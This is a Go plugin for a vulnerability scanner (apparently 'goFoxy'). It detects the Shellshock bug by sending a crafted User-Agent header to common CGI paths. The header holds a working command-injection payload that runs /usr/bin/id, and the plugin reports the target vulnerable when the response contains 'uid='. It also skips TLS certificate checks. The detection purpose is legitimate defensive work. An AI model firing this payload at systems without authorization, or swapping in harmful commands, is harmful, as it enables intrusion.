package plugins

import (
	"strconv"
	"net/http"
	"crypto/tls"
	"io/ioutil"
	"strings"
	"fmt"
	"goFoxy/manager"
	"goFoxy/common"
)

func init() {
	pl := shellShock{}
	pl.Name = "shellShock"
	pl.Author = "dk"
	pl.Default = true
	pl.Help = "破壳漏洞检测"
	manager.Regist(pl.Name, pl)
}

type shellShock struct {
	manager.Plugin
}

var cgiFiles = []string{
	"/cgi-sys/defaultwebpage.cgi",
	"/cgi-bin/test-cgi",
	"/cgi-bin/test.cgi",
	"/cgi-bin/hello",
	"/",
}

func (this shellShock) GetPluginInfo() map[string]string {
	infoMap := make(map[string]string)
	infoMap["name"] = this.Name
	infoMap["author"] = this.Author
	infoMap["default"] = strconv.FormatBool(this.Default)
	infoMap["flag"] = strconv.FormatBool(this.Flag)
	infoMap["help"] = this.Help
	return infoMap
}

func (this shellShock) SetPluginFlag(flag bool) bool {
	this.Flag = flag
	return true
}

func (this shellShock) Toggle() {
	if this.Flag {
		this.Flag = false
	} else {
		this.Flag = true
	}
}

func testShellShock(flow common.Flow, url string) {
	userAgent := "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;"
	var client http.Client
	if flow.Scheme == "https" {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip certificate verify
		}
		client = http.Client{Transport: tr}
	} else {
		client = http.Client{}
	}
	for index := range cgiFiles {
		newURL := url + cgiFiles[index]
		req, _ := http.NewRequest("GET", newURL, nil)
		req.Header.Add("User-Agent", userAgent)
		response, err := client.Do(req)
		if err != nil {
			continue
		}
		if response.StatusCode == 200 && response.Header.Get("Content-Type") == "text/plain" {
			body, err := ioutil.ReadAll(response.Body)
			if err != nil {
				continue
			}
			response.Body.Close()
			if strings.Contains(string(body), "uid=") { // 存在漏洞
				tmpInfo := common.Vuln{FlowID: flow.ID}
				tmpInfo.Host = flow.Host
				tmpInfo.Title = "破壳（Shellshock）漏洞"
				tmpInfo.Level = "高危"
				tmpInfo.Content = fmt.Sprintf("%s 可能存在破壳漏洞", newURL)
				common.LogVulnInfo(tmpInfo)
			}
		}
	}
}

func (this shellShock) Process(flow common.Flow) {
	url := flow.GetSafeBaseURL()
	go testShellShock(flow, url)
}
